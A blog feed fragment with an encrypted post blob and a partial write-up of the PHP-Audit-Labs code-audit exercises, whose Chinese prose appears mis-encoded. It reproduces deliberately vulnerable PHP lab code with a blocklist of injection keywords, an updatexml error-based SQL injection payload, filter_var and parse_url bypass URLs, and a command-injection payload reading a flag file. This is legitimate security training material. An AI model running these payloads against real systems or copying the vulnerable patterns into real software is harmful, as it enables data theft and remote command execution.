3a1681039ed7e24425f4331da219578f8df3d9d673bff596cf63e8d48981e3fe11ae698e099e6fb8a0362c66a0616729343325478118e45eb82d01be741203d617b81fd0209fd4a04c40d64edda9096bfb2f87f5048a7328007db747e96f1a6ac03fa44c8ca6901c37ea67a56b3efaab0f3c454b54108bd2a48b1b625af08af5b4dec38dd0466749b87052dd4bb48ffefbbae432d29d87cc0efa22bb572f1e2723e121d13c475eb27f10606d34aae276f80015a604ad0c54f9c3b7b19d5d7d6d507db2df7081c889aa26743831ae2b7b601143ff89ebd834f9669eb9fece4ed892bddfa6d0c4fc72d3a87c2d5c2fe158b6bb605b88c5dd2f3bd68482a5ef2e815150a0900c63b565cdf3d140c46f0401cc82dce7e2c01ae7e42c4d9911df7ee7e3d01c3fb691f7dec8e894aabd096156f063ab373f405ee5049da122873ff2393c7000c6619d6ea2bb709bd77b1b5f338c3f182c80e115ea8edbf16499448adb481ab85aa22229051ef32e9dc1304a0aaea62c5bca3ddfaec888a2de8243cb7603d68dc8390c82975375697f79ce3d92b588beb6a698625caa1f6cf93e58ebb8e8516225a21bd6ba9f421c80375429aaeef28e013b3a06abf4d7b1be5bdfe175ce91bc5b53337c832bb92765ebbf6c7288cf73795e19a5edeccc40e024ffd0e93fcaec1a98d9a68fa928babbeea608b205d8f863e8b3815cf3438759e96dcecb8a96f23bce5df46ae27034ca1c5b71df378b6516531a49cbebc196f3d35b86902d45a7e09bdbd684a40e62036e5946eb2952f36851913b23b28a36e29170dac2096d4f405b992b9834fbdebf865fe61e45a80cea9275f9f831f7ef83e4b02e1e19612b52e9b183b7d0d7386249536c7d31d5bf9c3a5b1695f4785aea368f66df379981dcc6c72eb165436a2c8b6246d8ed8d175f476b570fed776c3da98fbda08666894cb1036fcd1de6e695746faa121feb2de39cbdec0a81023814334c9b2aa3736ff89514d25d25798598f066bc7012812a328c2d0b8d9021f6d17d6b5046a910c87674578d8542b2ca93cb253ae13519e581af91a2f17454faa5f4acfee6ee3cd24871b5d517c6d029e050ac76f7516d1b88aaf56c41f8a6020bb05659ad50431c3ea0f473daec669e9ab2d388f06d5feb1133e71cc356994def9ae179161d1c0a3a17e158bb5aed21e261a88f2c19b858d6a453a479a74d109be6d8a0f1c6d0b2166f7bcbe345d62c37bd1dd95b73c502fdd393d7915546de86eb5b34b6344602c59bfd43ea15b670bc245b75d3c5e4797160e02fae7ee6ddc1a907907baf61e112d578e1146b9875fc56646a439ac53056fab3434795163ec952a30f745f8e7c56d944df1174c8da94e698eaa558b6dcaedaa0d8026e30974275ce06941209e78e9cdc2ce6747bc204944c33eaec4d2ee33d353dff91a855ac680b75ca652ce037ce35b46613029626c4664cef22769806b0eee2a42a57e9027044ae9a60258ed7da4bdab1b6a5b41d28d2a93d9b14d7360fe2bc94fbd8dc4ffb8d17aa338ad08baed28d61152900730fff93d10c51bcccdbe18681c423fd4fc5976b8661da82aff76abf92ab46cd370e26e903331a5c25e5c74b41002ae5d2f1e3f796453c8f3499ffe43f1ca4a80e31d7d435df666b69248d3fface54c67a1ec4ee63535c1d3a5072b0cde3cccad28a243409d14bc760b7b2e828146769f0c10727626c459b8143d64b55a3273ca849a9d22a178da66a612594ec3304af1008a874f622f185cd6dbfe091b881352fdd13f38422d14a3a06f0106a22f8c980cd112d3af82d94cbd53e41d5f8370d6b898f4a0768e9e069d7584d9c20764bd961b6e0e43e5e18892493edfb51b4d418f848e2f3893dd6867baea1ac41825566459451bebbfd1d5da54b6e5d3fb088c968b71e372064b436efeadbb1a2ffaca2aca136f96d939a4dd4bd2588f5217b3ff22fc8b4965182f8c99b7717657124d71bbe6e29c0f486d62cabf6f2e0b01422e4df0279abb1ccb74b0dee32bf41bcde981e545d11bd16d7c9e91f9659d75690d5af72a01bd51ce95d613311755791329e7bb47837e92f4a5ceea1d63f553decbc20da63534599621c22e763eed025dcccd3e5df0019cedf8721bf11f593c12a08525080f1886657fa888c2613cf78066d00c299f30b891c8eaa294811a5c5ea613bbe76b341f5f14c4594bcfe9b8f3f302402d7b9744e7d14989bb5bd62f5a2bc7689ebef00c5750985f18f4a6c4082ea3a22d0fbf77d447e30b74714b968348a6d31cee7eabccf83371aef8c938f9d2532e7cd3e7d1e75c08cbcbc236a71ce78cf40f77faf8381efcf426999892f8c30fa449fa397245ae26fe6823c423b72277c4fa220147aff69bf4b426a225de8c0c3da39f90c8c7c45ac1911c782af41b082299529ce957796d042ced372d43b5430e2948b104c263d8d3b0fdc99a6293034832a74f01c0687159a8f362679bc29e27d98304ba7b8c9f96d080ac5c5e484f339fff633cf84a111a0ea61bb1fd33ef376c72491c7ba99940ea201c0954066d02e0fa8b51e069a9c61006da93309e0eda26c7ff9829d013aecb7ca858f0606ed54de024633352c37d0d970d9284e9aa7cbfa8d15eb7aff6462ffee75e2b50405627bfe7d6506d95db63beeb84305e466dafa5b75da06d0d59410af7c4bfd96a47de27c981eaf80632b51a03950a0a0b69917470fc69ef361c9e25cb798802dff630995b6a0d6dd8d2296300ac9a5be47312a5a9c2dbec65db01ec34b74fc96392f05e03e59077d4e24ed8183d1d7434f87300c650c7fb3cef2ac130bc233b29080dbbbafc610aa40f990cd76af5a5917fc068e87bbd150295bbae1e6a2bfbe1df37ce5cc5756715be1f8072c10994de7f14aa0b78dafb403ac89eb917ed1a173ee5819584f6dfa6dff609ec2fe5b277a773f5578f09b76a2f1d733481cc49eaeafa9aa5cf5603daeed620dad41c37d2fc6a10490c1582b05d415a4106d0a993bf54bcea2dd431f9551860caf42c7982f051174d65029908bfb6be9286c45118bbd2ce9374ec116373252a48e01e47982be24fa00b35b79ab9339e78f09c750788865575fb8ef7eaddca8815f0b7edb58671081db0dcb5c0f65d9abd675fa0b20ddc9208dad1409f691934af6d050d259ec03d8c0b655dbafba40038ce98aa920bf76770b8b2f4e679544ea68cd81a74456d128fbd7dc59014bf6a37e0f754eff1234af043bbc431ca6bce10ba1950206ee98134211b0b16b5c9853172597007330c7d95799c36f57f6cdd18bdccee79bdc631c94548eeef72daf5f0ae2b2ffe3ad5782f4e58c8b92d485ad996e8cf76b1acebdd8ebbb44df5e14c0cb51a882527bed482bc7bb395ed32926d0c2850928bc5e87f3f2ff8722dd2aecb1b7c43e3fd01f74d51b55ca17c7fd9121567981181bb37d7e5216c0b20c19cd34fc0edef7655c88a025b4bcf18429b5d72b2d0d4c3786c8a79fb7404ab747edece84cf5f8cb5d9806ca3522d3e92a0572968b131f64e5919fc6d81b877d1d604b8aaead2ec52ef6380c2837d0cbcdd96f7cb57b30de17b9874db8a533f2dcfa55fe5b21bfb208cd82525b845755fee3b21c4d20b9145bf94b913d1d73186a3f30e99809d3e46a11f74099211bf30834e8a6f1e1bab9338cbad93983adf5aff853d80a9f955ce4f3a4013844533c5eb4b68c95ab8cfafec826fee7a5c3f5864fd53718dcac7934128b80147ccb9014a714722009ddda55397a256b6ca6864f5ab0f4644d8190ef8ba964f0eadf0b6dec8fb6fb1f33a1fe0d0f21317ad436ba1c133efb143ba322b4ac2a63070d6c04ee43191c3b128d564128293377a8e9774cc057fb36bb08c1f93c422ed356485a12f1c4103c7eded2483381e7c3fc1ff0e426c37f16c4345b217dc1ae6b9208d8b5a950423168eacc389ad871b25e818d357d30be37c12a4a18b93865fe8c9927d627df79db8f8f663e76a089eab85e28a34983162c14be49fb033bed123d957af4d6dfc420767747926fb2474732883a7680442f7725f7f09b68a21f12d2aed8fa9e322490d4d4e23cd8708634af5f40c2a385323c0bbbf2acce6b41aaf98b2906cd1d5b3361d2c0bcaf9b1be82d59d63a91c2469daf4c6476dac048c993007b6bef8d9b228ca33f59c288c0e1dc381890d27259abf29af39810b7c4b3e6f776a1ef475825a221380df1892aad151c639d65d31c308ad6481da731fc9b078ba03fbd5aaf1492e3a7e76e8f526d3ad774388895074ebfabd203a13f100cb83dc3e3e861f4e409321c973d7c4134895b28738158da227e4e26dc0af375e076dd69c708a59b3f2f07db876fed5d2a2dbe48daaac3050591d4c7c4d4aa9ae659069c6e1c10985343762820ccfad027c99008e4ccb12354e846aa99b3f291d5011b36d36fdd72cf3f323bf9984a97e1d726a1f410c3f7d4893d5eecfc8f5b93b2c0f0a6073efda4bd5c128eef8a88c6fd08de09e4bf1489710ce0b779eb38b4fe3b6e525ad3de618702f34358d9dbeee819639bed0352ff737abea18c8464de8e99daacdc752e4004c3f7e786941496549b6c74eb95d58ac585ea0cb4119b051e796bd128fcaba584449127742d2ee32e971b286bea16afab061df3f62c62d216d7a26a31e282ea65e18b13d68844371a820c6b49a76e94db4e917e206a7c19263680e850cd0d1d8ae1389be01a5af78afff0a26ebca69e2f9dcc63bbec8b7e030bda15f90b981c6a3864673ba07cab052c8477176a5c283ba10dd5eec9859e2b7d1f0607a12a1cb54b87e6205fab1bd655d13982b6b5a23c15050f609b81c6a5c51b7f0889a76ff8bf6d3a0f9c18e8aa76b0d2d6bff9d08095f5ca95dbcc434a8cbeb47025f9f217e1e1961276546b499e9cddf74cfa75fdd596d23abb6a86c0d7186884a460aa7cb923477209b41d582755c6a559e5a4b4c89cd3a61b1fc09d36f1d3e163ec3f8e3df2c3ac06904c338b9d691549017c7f3d323d09e199bbea368704855c84715befe06882d5945a231bf240020f786444ac040c3fe15c4c4401861f4e94dbba4b822cb19974304209bfa1ebbab03d0c14a28764ee7bd779c829d298e4b48819d7d1728bedbef96672a636b74136e41d579364b2087ab3c26794dabd7d632bd1e604ac830ee032da534d328d76c6c70481859ced5bcac75c85bb471471b74786d5cd78afc96569e68765630ec87d2b398fdbfca7881e61d2fcaa2524f6d1910e036df7d5d9e13acf884870c86574a94c092934190ac13e3e0e1f40fb8dd8e8d10c8cf7f506582c334d31fe7acdba7557592779016d49d599722faa4ef018e86e2f9c927bf78d98694d304d0247e8dca85262d694186a21228ae8cf5cff5784359f7cbce0b6e12347c1e93f5bfbff549cdccd1e417276fdf549a6a19633d1ef5472eda013d3ffc14f3a4900bd7203135491d003463c7c2e1616d11f1faf99c2e136bacc69b4d6e31d5b2b870da488c1ebc69356e53bba8834d630cd696fadd625896f5ad7f05f5ae7ec949afe07b238ec6175764197e706596ce5264e8849eea526012b6159ad6f4a25f1ee928c58d458be9424c7d6d80520df58a62c89f97c435daa81a159ac836185c69fa59b0619d7fa159c07a945367c0b2281d1ee3de142b9b369274d36b5f3daeae69735963999f86bf3fc3f66c9fb79ce0166fe32db4032cb7685ce935323f7ecce07a334306d3dd2d6b83f27634b6253c2b4fdab804f3d0e3451de65b1100d087a330dcbfece8a37496db6239a2985570a8e752451a1f1373ffc037484a7673777bea0011f870e224044b2455ac0e1c56a845749cfea687a8029aa75e44b10b46b01a636a57661981910a374599233e92e03f465860c7f8ba96870221934cf0d0bb73fa1a8c7f75ec4e09d93f1811bac8e9b94f9ef59dc892aa99e750c18218af5f67677e4ae521ab4472fef5af584651ca9cf20560b8fe07d2e9cb5dd97bfe321a139e9b6fb2e2bfe797e2fc7760bf92c5baac172fb2fd78073d4cfed6defae01804a3c51263d5b594f9bdbb3adb1494a79180b9f0f438f7c083e471cc3b09afd91afbc569dccea8c5bc924fa0eee340d59532c2d31af40a9ec0cd2d0f8b12ca7ac295d0b9c9426ee9028880dee31ae44b0cc120ad39ac4f669ac5afb5bb857509877a2106ea03da51ca07c346c723d9d6bc0c06b710936ccfb9c72983a108455f5e6bf180a366b404b4049dcfa7bbb8944e4473755dd68837746432a0196e6217f291839c134ecb1d5a2517bf0a2b0833a23be1628bad3bc8f7734145bef67e34303ccd7005f3950a41a0baa41c2af258f156d8b45dd88893e9c2549af8962667836218f761b8d879ca0c93b6d689f135101c258250f4cbd03b53bd34fe825dcf0827f23168fad38408a17dfaecb9fc3ea0abc0c1b83843633542ae69ccc2efa437a66f8798a560bf561a5e50aa5d85a17fe6f8ad49a34da958dde59d55efd2039ee36022fe6e1833dff15a039a7169a6e256037e475dfda17c75b6b4da0cd656d1c858a1a2ae47ada4f34091b9e5d3a9a386b2ed0a12231f88cd7acd254aa0ec82fe759ae9b1d16ff2db71c54ec9640625de06e064f9941c72a51970c33edfa2ee93838ff5dee92539958c22ae69602cbc2f758996a554da0b08c002608bc47800e6630f221e0db135ba1998bf871475907463f2d3582125bf40ba8b7e99979b2fae8a6824ff68e12ad7cdc2bef6c720b66f499454bda5ecd9c8c847875b21027b3736c60d005b84b020d2bb1a34d5613a260a9c79e037b999e8415e930974752cec757de920dd1295817111adb17e6bcda613ba236f2000b8f3a429c669ab3c024ce3ffc1966c168b03346e3a9b8ac74d4bd96ace3aa82a9a451639187a1187a624edaee0977f094fc03dcc9b49d516b764c9f169cda2f35fa8359c866b766efad6965e2eac15c105a8c630f72652ba5d223abf0cd641ece2a519a6504729078da855803637cb991541d6c5b3ccedc036ca8f29df8c436b7e90330466119ab6f86bebc9ea5a6c6874b04d586fbbc8aa0ad3b44740eb09a11a3ea8711e3e021e04e5fed2b1f81454f0be805d2a1ee0b4163ba0a86017b94bf9ced15a7ebbf32530ec235c9284d651c01c0ef00fe100b6aa659c9a79964b5010f1484a9978848cd4444d993190eaa925c85383e9f49f9ee730cd741065ff6aaa6ab0ccb312138a56c751c2279fb9208c2f391c3743024f1c13dc8f3ed3562d0202897de44fec48bd4e80efefa5b84d8974cb50264d26881aa2a5c61083a0177cffa4551da53e20a494290304321066fd7c1d13b3403ed271eeafe13d4573d46c87ded16a57af92f8b13d7413d1fc364a9dbb1bf39bd6179ba26f6b4d823c14a8f817cb9fa52d3071efcab1ccf363d6799d1511d87470acedc020a2146fb0631d2a534bc2fa58ec1a068130ae7b9722c883085de06fff6b520aa23a1316220a6961ad5a56ddde9cdce84d686ed89e471bd5628dc26676969259ee2cf5dd78acb2cc9cdecc135c75ce5a9a99689f96c77ccd555c8f4dc0531e3c42274745eed562934cb9c93a74630a63aee597dbf8eb32ef01b9801e5738540300f7580364029c32ca5c28b2411254fdc9293e35a507dbd37122817b9cb66fe78ae94852b132b48c6b148cd77c1d2035c6dc0d71cbb0d5191ebf6470465d2b1155e405abea56d3ee2bd40e56e69fb1507ec33a4f1a61492e0979d4d3feda00236e22419696d378453f1dac0cad921877cb0788a4f71bc43d879d0483d94eb4b3af0b3011635289b39e19cadbce324bcb8706b3749c08453f712be83690913c8dcfdb175ee7e413f753c55f21cbbe9587fee4e4fb30bbf5dd7d40202c72bd1b1947fa7222f3fa0bd3bb5bff5a4f6fbb8fca7e46e5cde7a39178fae543629f58b0166809b501e44ea42ea2970cd337e248a4db95d481979821163e3ab</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      å’¦ï¼Œè¿™æ˜¯ä¸€ç¯‡åŠ å¯†æ–‡ç« ï¼Œå¥½åƒéœ€è¦è¾“å…¥å¯†ç æ‰èƒ½æŸ¥çœ‹å‘¢ï¼
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹â€”â€”PHP-Audit-Labs</title>
    <link href="http://yoursite.com/2020/08/18/PHP-Audit-Labs/"/>
    <id>http://yoursite.com/2020/08/18/PHP-Audit-Labs/</id>
    <published>2020-08-18T10:13:47.000Z</published>
    <updated>2020-09-16T05:11:23.973Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨githubä¸Šé¢æ‰¾çš„ä¸€ä¸ªä»£ç å®¡è®¡çš„é¡¹ç›®ï¼Œåœ°å€æ˜¯ï¼š</p><blockquote><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/">https://github.com/hongriSec/PHP-Audit-Labs/</a><br>æ­£å¥½é€šè¿‡è¿™ä¸ªé¡¹ç›®ç»ƒä¹ ä¸€ä¸‹ä»£ç å®¡è®¡ï¼Œæ¯ä¸ªéƒ½åŒ…å«äº†ä¸åŒçš„çŸ¥è¯†ç‚¹ï¼Œå­¦ä¹ å­¦ä¹ ã€‚</p></blockquote><a id="more"></a><h2 id="Day1-in-arrayå‡½æ•°ç¼ºé™·"><a href="#Day1-in-arrayå‡½æ•°ç¼ºé™·" class="headerlink" title="Day1 - in_arrayå‡½æ•°ç¼ºé™·"></a>Day1 - in_arrayå‡½æ•°ç¼ºé™·</h2><p>é¢˜ç›®å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;è¿æ¥å¤±è´¥: &quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;SELECT COUNT(*) FROM users&quot;;</span><br><span class="line">$whitelist &#x3D; array();</span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist &#x3D; range(1, $row[&#39;COUNT(*)&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id &#x3D; stop_hack($_GET[&#39;id&#39;]);</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE id&#x3D;$id&quot;;</span><br><span class="line"></span><br><span class="line">if (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    die(&quot;id $id is not in whitelist.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">    echo &quot;&lt;center&gt;&lt;table border&#x3D;&#39;1&#39;&gt;&quot;;</span><br><span class="line">    foreach ($row as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">        echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;&#x2F;center&gt;&lt;&#x2F;td&gt;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;&#x2F;center&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;&#x2F;table&gt;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;config.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$password &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;day1&quot;;</span><br><span class="line"></span><br><span class="line">function stop_hack($value)&#123;</span><br><span class="line">    $pattern &#x3D; &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\&#x2F;\*|\*|\.\.\&#x2F;|\.\&#x2F;|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;;</span><br><span class="line">    $back_list &#x3D; explode(&quot;|&quot;,$pattern);</span><br><span class="line">    foreach($back_list as $hack)&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;$hack&#x2F;i&quot;, $value))</span><br><span class="line">            die(&quot;$hack detected!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯<code>in_array()</code>ç»•è¿‡å’Œä¸èƒ½ä½¿ç”¨æ‹¼æ¥å‡½æ•°çš„<code>updatexml</code>æŠ¥é”™æ³¨å…¥ã€‚<br><strong>in_array()</strong>ï¼š<br>åœ¨index.phpä¸­æŠŠidå€¼ä¼ å…¥whitelistæ•°ç»„ä¸­ï¼Œç„¶åç”¨æˆ·ä¼ å…¥çš„idå…ˆç»è¿‡è¿‡æ»¤å‡½æ•°è¿‡æ»¤ï¼Œç„¶åå†ç”¨in_arrayåˆ¤æ–­ç”¨æˆ·ä¼ å…¥çš„idæ˜¯å¦åœ¨whitelistä¸­ã€‚è¿™é‡Œ<code>in_array()</code>æ˜¯æ²¡æœ‰ä½¿ç”¨å¼ºåŒ¹é…ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ï¼Œå½“ä¼ å…¥çš„idå€¼ä¸º<strong>1â€™</strong>ä¾¿å¯ç»•è¿‡in_arrayå‡½æ•°ã€‚<br><strong>updatexml</strong>ï¼š<br>è¿™ä¸ªstop_hackå‡½æ•°æŠŠè¯¥è¿‡æ»¤çš„éƒ½è¿‡æ»¤äº†ï¼Œå…¶ä¸­è¿‡æ»¤äº†concatè¿æ¥å‡½æ•°ï¼Œè€Œæˆ‘ä»¬å¦‚æœä½¿ç”¨updatexmlæŠ¥é”™æ³¨å…¥å‰é¢éƒ½è¦æ‹¼æ¥<code>0x7e</code>è¿™æ ·çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¦åˆ™æŸ¥è¯¢çš„æ•°æ®ä¼šä¸¢å¤±ä¸€éƒ¨åˆ†ï¼Œè€Œconcatè¢«è¿‡æ»¤äº†ã€‚æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ <code>make_set</code> æˆ–è€… <code>export_set()</code> å‡½æ•°æ¥æ‹¼æ¥å­—ç¬¦ï¼Œå¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/fangzy0112/article/details/27323603">mysql make_set()çš„ç”¨æ³•</a>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,export_set(1|1,&#39;~&#39;,(select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~,root@localhost,root@localhost,&#39;</span><br><span class="line">mysql&gt; select updatexml(1,make_set(3,&#39;~&#39;,(select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~,root@localhost&#39;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸€ä¸‹æœ¬é¢˜payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1))</span><br></pre></td></tr></table></figure><h2 id="Day2-filter-varå‡½æ•°ç¼ºé™·"><a href="#Day2-filter-varå‡½æ•°ç¼ºé™·" class="headerlink" title="Day2 - filter_varå‡½æ•°ç¼ºé™·"></a>Day2 - filter_varå‡½æ•°ç¼ºé™·</h2><p>é¢˜ç›®å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info &#x3D; parse_url($url);</span><br><span class="line">    if(preg_match(&#39;&#x2F;sec-redclub.com$&#x2F;&#39;,$site_info[&#39;host&#39;]))&#123;</span><br><span class="line">        exec(&#39;curl &quot;&#39;.$site_info[&#39;host&#39;].&#39;&quot;&#39;, $result);</span><br><span class="line">        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#39;host&#39;]&#125; successfully!&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">              &lt;center&gt;&lt;textarea rows&#x3D;&#39;20&#39; cols&#x3D;&#39;90&#39;&gt;&quot;;</span><br><span class="line">        echo implode(&#39; &#39;, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;br&gt;</span><br><span class="line">          &lt;center&gt;&lt;h3&gt;For example:?url&#x3D;http:&#x2F;&#x2F;sec-redclub.com&lt;&#x2F;h3&gt;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè€ƒå¯Ÿçš„æ—¶filter_varå‡½æ•°çš„ç»•è¿‡ä¸è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œä¸­é—´execå‡½æ•°æ‹¼æ¥äº†<code>$site_info[&#39;host&#39;]</code>ï¼Œè€Œ<code>$site_info[&#39;host&#39;]</code>æ˜¯parse_url($url)å¾—æ¥çš„ï¼Œurlæ˜¯æˆ‘ä»¬ä¼ å…¥å¯æ§çš„ï¼Œé—®é¢˜å°±æ˜¯è¯ç»•è¿‡filter_varçš„FILTER_VALIDATE_URLè¿‡æ»¤å™¨ï¼Œè¿™é‡Œæä¾›äº†å‡ ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23</span><br></pre></td></tr></table></figure><p>æ¥ç€è¦ç»•è¿‡ parse_url å‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³ $site_info[â€˜hostâ€™] çš„å€¼ä»¥ sec-redclub.com ç»“å°¾ï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%23;sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨windowsä¸‹åŠ ä¸Š#å°±ç»•è¿‡ä¸äº†äº†ï¼Œåœ¨linuxä¸‹å¯ä»¥ï¼Œç„¶å<code>cat flag</code>çš„æ—¶å€™ï¼Œå› ä¸ºfilter_varå‡½æ•°ä¸å¯ä»¥ä½¿ç”¨ç©ºæ ¼ï¼Œæ¢æˆ<code>cat&lt;flag</code>å°±å¥½äº†ã€‚</p><h2 